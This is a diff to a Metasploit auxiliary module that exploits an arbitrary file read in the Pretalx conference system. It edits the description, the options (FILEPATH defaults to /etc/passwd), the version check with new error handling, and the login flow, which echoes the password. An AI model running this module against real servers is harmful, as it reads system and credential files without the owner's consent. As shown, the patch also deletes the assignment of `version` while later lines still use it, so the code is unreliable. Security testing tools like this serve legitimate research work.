@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'Pretalx Arbitrary File Read/Limited File Write',
-        'Description' => 'This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires crendetials that allow schedule export, schedule release and approval of proposals. Additionaly, module requires conference name and URL for media files.',
+        'Description' => 'This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires credentials that allow schedule export, schedule release and approval of proposals. Additionally, module requires conference name and URL for media files.',
         'Author' => [
           'Stefan Schiller', # security researcher
           'msutovsky-r7' # module dev
@@ -32,7 +32,6 @@ class MetasploitModule < Msf::Auxiliary
     )
     register_options([
       OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
-      OptString.new('FILE_CONTENT', [false, 'Content to overwritten file']),
       OptString.new('MEDIA_URL', [true, 'Prepend path to file path that allows arbitrary read', '/media']),
       OptString.new('EMAIL', [true, 'User email to Pretalx backend']),
       OptString.new('PASSWORD', [true, 'Password to Pretalx backend'])
@@ -49,11 +48,17 @@ class MetasploitModule < Msf::Auxiliary
 
     return Exploit::CheckCode::Detected unless version_element
 
-    version = Rex::Version.new(version_element)
-
     return Exploit::CheckCode::Appears("Detected vulnerable version #{version}") if version <= Rex::Version.new('2.3.1')
 
-    Exploit::CheckCode::Safe("Detected version #{version} is not vulnerable")
+    return Exploit::CheckCode::Safe("Detected version #{version} is not vulnerable")
+  rescue UnexpectedResponseError
+    return Exploit::CheckCode::Unknown('Received unexpected response, check your options')
+  rescue VersionCheckError
+    return Exploit::CheckCode::Detected('Pretalx detected, failed to verify version')
+  rescue CsrfError
+    return Exploit::CheckCode::Unknown('Failed to get CSRF token')
+  rescue SessionCookieError
+    return Exploit::CheckCode::Detected('Pretalx detected, failed to get session cookie - check your credentials')
   end
 
   def run_host(ip)
@@ -68,8 +73,6 @@ class MetasploitModule < Msf::Auxiliary
     registration_info = register_proposal(proposal_info)
     proposal_name = registration_info[:proposal_name]
     vprint_status("Submit proposal #{proposal_name}")
-
-    cookie_jar.clear
 
     vprint_status("Logging with credentials: #{datastore['EMAIL']}/#{datastore['PASSWORD']}")
     fail_with(Failure::NoAccess, 'Incorrect credentials') unless login(datastore['EMAIL'], datastore['PASSWORD'])
